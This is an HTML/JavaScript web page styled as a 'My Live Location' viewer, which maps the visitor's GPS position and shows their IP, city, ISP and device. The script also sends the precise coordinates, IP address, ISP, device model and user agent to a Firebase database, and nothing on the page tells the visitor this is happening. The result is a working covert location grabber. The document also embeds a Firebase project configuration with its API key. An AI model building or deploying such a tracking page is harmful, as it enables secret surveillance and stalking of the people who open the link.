<!DOCTYPE html>
<html>
<head>

<title>Live Location Tracker</title>

<meta name="viewport" content="width=device-width, initial-scale=1">

<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>

<style>

body{
font-family:Arial;
background:#f4f6fb;
margin:0;
}

header{
background:#ff4b5c;
color:white;
padding:15px;
font-size:22px;
text-align:center;
}

.container{
width:90%;
margin:auto;
margin-top:20px;
display:flex;
gap:20px;
}

.info{
width:45%;
background:white;
padding:20px;
border-radius:8px;
box-shadow:0 2px 6px rgba(0,0,0,0.1);
}

.row{
margin-bottom:12px;
border-bottom:1px solid #eee;
padding-bottom:6px;
}

.label{
color:#ff4b5c;
font-weight:bold;
}

#map{
width:55%;
height:400px;
border-radius:8px;
}

#status{
margin-top:10px;
font-size:18px;
text-align:center;
}

</style>

</head>

<body>

<header>
📍 My Live Location
</header>

<div id="status">Please Wait...</div>

<div class="container">

<div class="info">

<div class="row"><span class="label">Latitude:</span> <span id="lat">...</span></div>
<div class="row"><span class="label">Longitude:</span> <span id="lon">...</span></div>

<div class="row"><span class="label">Country:</span> <span id="country">...</span></div>
<div class="row"><span class="label">City:</span> <span id="city">...</span></div>

<div class="row"><span class="label">IP Address:</span> <span id="ip">...</span></div>
<div class="row"><span class="label">ISP:</span> <span id="isp">...</span></div>

<div class="row"><span class="label">Device:</span> <span id="device">...</span></div>

</div>

<div id="map"></div>

</div>

<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
apiKey: "AIzaSyAilTyrtwRg5nQ-LpTJkhHiBn33JV14Zbc",
authDomain: "location-tracker-bba55.firebaseapp.com",
projectId: "location-tracker-bba55",
storageBucket: "location-tracker-bba55.appspot.com",
messagingSenderId: "951484366467",
appId: "1:951484366467:web:2e936d42b1704027f665b6"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

var map = L.map('map').setView([23.8103,90.4125],10);

L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
maxZoom:19
}).addTo(map);

function detectDevice(){

let ua=navigator.userAgent;

if(/mobile/i.test(ua)) return "Mobile";
if(/tablet/i.test(ua)) return "Tablet";

return "Desktop";

}

function detectDeviceModel(){

let ua = navigator.userAgent

// iPhone
if(ua.includes("iPhone")) return "iPhone"

// Samsung
let samsung = ua.match(/SM-[A-Z0-9]+/)
if(samsung) return "Samsung " + samsung[0]

// Xiaomi
let xiaomi = ua.match(/Mi\s[A-Z0-9]+/)
if(xiaomi) return xiaomi[0]

// Huawei
let huawei = ua.match(/HUAWEI\s[A-Z0-9]+/)
if(huawei) return huawei[0]

// Android generic
if(ua.includes("Android")) return "Android Phone"

// Desktop
if(ua.includes("Windows")) return "Windows PC"
if(ua.includes("Mac")) return "Mac"

return "Unknown Device"

}

async function saveLocation(lat, lon){

let ip="unknown"
let city="unknown"
let country="unknown"
let country_code="bd"
let isp="unknown"

try{

const trace = await fetch("https://www.cloudflare.com/cdn-cgi/trace")
const txt = await trace.text()

const lines = txt.split("\n")
const map = {}

lines.forEach(l=>{
const p = l.split("=")
if(p.length===2) map[p[0]] = p[1]
})

ip = map.ip || ip
country_code = (map.loc || country_code).toUpperCase()

const geo = await fetch("https://ipinfo.io/json")
const data = await geo.json()

city = data.city
country = data.country
isp = data.org
ip = data.ip

if(data.success){
city = data.city || city
country = data.country || country
isp = (data.connection && data.connection.isp) ? data.connection.isp : isp
country_code = data.country_code || country_code
}

}catch(e){
console.log("IP lookup failed:", e)
}

document.getElementById("ip").innerText = ip
document.getElementById("city").innerText = city
document.getElementById("country").innerText = country
document.getElementById("isp").innerText = isp
document.getElementById("device").innerText = detectDevice()

await addDoc(collection(db,"locations"),{

latitude: lat,
longitude: lon,
time: new Date().toLocaleString("en-GB", {
  timeZone: "Asia/Dhaka",
  day: "2-digit",
  month: "2-digit",
  year: "numeric",
  hour: "2-digit",
  minute: "2-digit",
  hour12: true
}).replace(",", " |"),


ip: ip,
city: city,
country: country,
country_code: country_code,
isp: isp,

device: detectDevice(),
deviceModel: detectDeviceModel(),
userAgent: navigator.userAgent

})

}

navigator.geolocation.getCurrentPosition(

function(position){

let lat=position.coords.latitude
let lon=position.coords.longitude

document.getElementById("lat").innerText = lat
document.getElementById("lon").innerText = lon

document.getElementById("status").innerHTML =
"Location Detected"

map.setView([lat,lon],15)

L.marker([lat,lon]).addTo(map)

saveLocation(lat,lon)

},

function(error){

document.getElementById("status").innerHTML =
"Location permission denied"

},

{
enableHighAccuracy:true,
timeout:10000,
maximumAge:0
}

)

</script>

</body>
</html>
